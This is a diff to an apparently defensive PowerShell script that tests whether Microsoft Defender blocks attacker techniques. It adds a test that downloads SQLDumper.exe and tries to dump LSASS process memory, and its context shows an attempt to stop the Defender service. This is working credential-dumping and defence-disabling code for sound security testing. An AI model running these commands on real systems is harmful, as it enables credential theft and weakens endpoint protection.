@@ -163,6 +163,10 @@ function displaymenu($mitems) {
         Number = 35;
         Test = "PowerShell script in fileless attack"
     }
+    $mitems += [PSCustomObject]@{
+        Number = 36;
+        Test = "Dump credentials using SQLDumper.exe"
+    }
     return $mitems
 }
 
@@ -685,7 +689,8 @@ function servicescheck() {
         write-host -ForegroundColor $processmessagecolor -nonewline "- Attempt to stop Microsoft Defender Antivirus Service has "
         $servicestop = $true
         try {
-            $result = stop-service windefend -ErrorAction Stop
+            $service = "windefend"
+            $result = stop-service $service -ErrorAction Stop
         }
         catch {
             write-host -ForegroundColor $processmessagecolor "failed"
@@ -1208,6 +1213,28 @@ function psfileless() {
     pause
 }
 
+function sqldumper() {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 36. SQLDumper ---"
+    write-host -foregroundcolor $processmessagecolor "Download SQLDumper to current directory"
+    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/SQLDumper.exe -OutFile .\SQLDumper.exe
+    write-host -foregroundcolor $processmessagecolor "Get LSASS.EXE process id"
+    $id=(get-process -processname "lsass").Id
+    write-host -foregroundcolor $processmessagecolor "Attempt process dump"
+    $result = .\sqldumper.exe $id 0 0x01100:40
+    if (($result -match "failed") -or [string]::isnullorempty($result)) {
+        write-host -foregroundcolor $processmessagecolor "`nProcess dump failed - test SUCCEEDED`n"
+        write-host -foregroundcolor $processmessagecolor "Delete SQLDumper.exe`n"
+        remove-item .\SQLDumper.exe
+    }
+    else {
+        write-host -foregroundcolor $errormessagecolor "`nProcess dump succeeded - test FAILED`n"
+        write-host -foregroundcolor $processmessagecolor "Delete SQLDumper.exe`n"
+        remove-item .\SQLDumper.exe
+        write-host -foregroundcolor $processmessagecolor "Delete dump file`n"
+        remove-item .\SQLD*.*
+    }
+}
+
 <#          Main                #>
 Clear-Host
 if ($debug) {       # If -debug command line option specified record log file in parent
@@ -1280,6 +1307,7 @@ switch ($results.number) {
     33  {formshtml}
     34  {backdoordrop}
     35  {psfileless}
+    36  {sqldumper}
 }
 
 write-host -foregroundcolor $systemmessagecolor "`nSecurity test script completed"
